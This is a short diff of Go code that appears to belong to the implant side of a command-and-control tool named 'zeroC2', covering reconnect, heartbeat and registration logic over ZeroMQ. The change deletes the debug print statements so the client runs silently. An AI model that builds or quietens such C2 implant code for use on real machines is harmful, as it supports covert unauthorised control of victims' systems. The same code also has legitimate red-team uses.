@@ -38,9 +38,7 @@ func migration(dealer, subscriber *zmq.Socket, C2ip, rport string) {
 }
 func reconnect(dealer, subscriber *zmq.Socket, C2ip, rport string, signal <-chan struct{}) {
 	<-signal
-	fmt.Println("server is dead")
 	ndealer, nsubscriber := getFreshSocket(dealer, subscriber)
-	fmt.Println("reconnecting....")
 	err := register(ndealer, nsubscriber, C2ip, rport, time.Hour*4)
 	if zmq.AsErrno(err) == zmq.ETIMEDOUT {
 		//reconnection timed out , returning to mother
@@ -82,7 +80,6 @@ func dealerhandle(dealer, subscriber *zmq.Socket, signal chan<- struct{}) {
 		}
 
 		if res[0] == "h" {
-			fmt.Println("heartbeat recieved from zeroC2")
 			dealer.SendMessage("h")
 		}
 
@@ -148,7 +145,6 @@ func register(dealer, subscriber *zmq.Socket, C2ip, rport string, timeout time.D
 				time.Sleep(time.Second * 2)
 			}
 		}
-		fmt.Println("Double connection prohibited")
 	}
 	return err
 }
